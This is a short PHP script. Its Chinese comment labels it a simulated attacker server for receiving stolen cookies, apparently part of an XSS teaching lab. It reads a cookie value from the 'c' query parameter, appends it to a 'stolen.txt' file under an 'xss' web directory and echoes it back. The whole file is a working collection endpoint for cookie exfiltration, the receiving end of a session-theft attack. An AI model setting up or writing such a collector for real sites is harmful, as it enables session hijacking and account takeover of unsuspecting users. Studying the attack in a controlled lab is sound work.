<?php
// ============================================
// 攻击者服务器：接收偷来的 Cookie（模拟攻击者控制的主机）
// ============================================
$c = $_GET['c'] ?? '';
if ($c !== '') {
    file_put_contents('/var/www/html/xss/stolen.txt', $c . "
", FILE_APPEND);
    echo "OK, got: " . htmlspecialchars($c);
} else {
    echo "empty";
}
